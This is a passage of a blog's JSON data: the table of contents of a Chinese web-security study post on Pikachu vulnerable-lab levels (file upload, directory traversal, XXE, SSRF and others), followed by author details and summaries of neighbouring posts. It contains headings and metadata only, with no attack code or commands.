href=\"#%E6%A6%82%E8%BF%B0-8\"><span class=\"toc-text\">概述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-8\"><span class=\"toc-text\">Pikachu关卡</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%A2%E6%88%B7%E7%AB%AFcheck\"><span class=\"toc-text\">客户端check</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9C%8D%E5%8A%A1%E7%AB%AFcheck\"><span class=\"toc-text\">服务端check</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#getimagesize\"><span class=\"toc-text\">getimagesize()</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86\"><span class=\"toc-text\">目录遍历</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-9\"><span class=\"toc-text\">概述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-9\"><span class=\"toc-text\">Pikachu关卡</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">敏感信息泄露</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-10\"><span class=\"toc-text\">概述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-10\"><span class=\"toc-text\">Pikachu关卡</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">PHP反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-11\"><span class=\"toc-text\">概述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-11\"><span class=\"toc-text\">Pikachu关卡</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XXE-xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">XXE-xml外部实体注入漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-12\"><span class=\"toc-text\">概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#XML-DTD\"><span class=\"toc-text\">XML&amp;DTD</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#XML%E7%BB%93%E6%9E%84\"><span class=\"toc-text\">XML结构</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%BC%95%E7%94%A8payload\"><span class=\"toc-text\">外部实体引用payload</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-12\"><span class=\"toc-text\">Pikachu关卡</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84url%E8%B7%B3%E8%BD%AC\"><span class=\"toc-text\">不安全的url跳转</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-13\"><span class=\"toc-text\">概述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-13\"><span class=\"toc-text\">Pikachu关卡</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSRF-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">SSRF-服务端请求伪造</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E8%BF%B0-14\"><span class=\"toc-text\">概述</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%A7%E7%94%9FSSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">产生SSRF漏洞的函数</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Pikachu%E5%85%B3%E5%8D%A1-14\"><span class=\"toc-text\">Pikachu关卡</span></a></li></ol></li></ol></li></ol>","author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"漏洞分类","uid":"d8c6760c0189ec6549efd1450ac394f5","slug":"漏洞分类","date":"2024-02-14T08:23:14.000Z","updated":"2024-03-03T08:48:32.114Z","comments":true,"path":"api/articles/漏洞分类.json","keywords":null,"cover":null,"text":"暴力破解漏洞 通过系统地组合所有可能性（例如登录时用到的账户名、密码），尝试所有的可能性破解用户的账户名、密码等敏感信息，经常是使用自动化脚本组合出正确的用户名...","permalink":"/post/漏洞分类","photos":[],"count_time":{"symbolsCount":"7.2k","symbolsTime":"7 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":21,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":21,"path":"api/tags/学习日志.json"},{"name":"WEB攻防","slug":"WEB攻防","count":3,"path":"api/tags/WEB攻防.json"},{"name":"漏洞分类","slug":"漏洞分类","count":1,"path":"api/tags/漏洞分类.json"}],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"小迪安全-P4","uid":"38e97d07cb4887821026c06ecc181448","slug":"小迪安全-P4","date":"2024-02-03T12:01:45.000Z","updated":"2024-02-03T13:58:50.083Z","comments":true,"path":"api/articles/小迪安全-P4.json","keywords":null,"cover":null,"text":"加密识别(猜测)算法编码类型 看密文位数 看密文的特征(数字, 字母, 大小写, 符号等) 看当前密文存在的地方(Web, 数据库, 操作系统等应用) 获取 (...","permalink":"/post/小迪安全-P4","photos":[],"count_time":{"symbolsCount":214,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":21,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":21,"path":"api/tags/学习日志.json"},{"name":"小迪安全","slug":"小迪安全","count":8,"path":"api/tags/小迪安全.json"},{"name":"基础入门","slug":"基础入门","count":5,"path":"api/tags/基础入门.json"}],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"web security learner, ML learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}